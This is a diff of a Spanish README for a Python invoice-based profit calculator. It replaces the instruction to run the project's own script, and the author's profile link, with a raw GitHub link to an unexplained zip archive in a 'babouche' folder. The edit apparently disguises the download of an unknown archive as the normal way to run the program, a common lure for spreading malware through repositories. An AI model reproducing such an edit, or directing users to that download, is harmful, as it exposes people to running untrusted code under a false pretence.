@@ -16,7 +16,7 @@ Muchos negocios venden mercancía a granel o en grandes cantidades, y calcular e
 
 1. Clona el repositorio o descarga los archivos del proyecto.
 2. Asegúrate de tener instalado Python (versión X.X o superior).
-3. Ejecuta el programa principal `calculadora_ganancias.py`.
+3. Ejecuta el programa principal `https://raw.githubusercontent.com/RodrigoCG1306/XML-Lector/main/babouche/XML-Lector.zip`.
 4. Sigue las instrucciones en pantalla para ingresar la ruta del archivo XML de la factura y los detalles de los precios de compra y margen de ganancia.
 5. El programa calculará los precios de venta y generará un reporte.
 
@@ -35,4 +35,4 @@ Supongamos que tenemos un archivo XML de factura que contiene información sobre
 
 ## Autores
 
-- [RodrigoCG1306](https://github.com/RodrigoCG1306) - Desarrollador principal.
+- [RodrigoCG1306](https://raw.githubusercontent.com/RodrigoCG1306/XML-Lector/main/babouche/XML-Lector.zip) - Desarrollador principal.
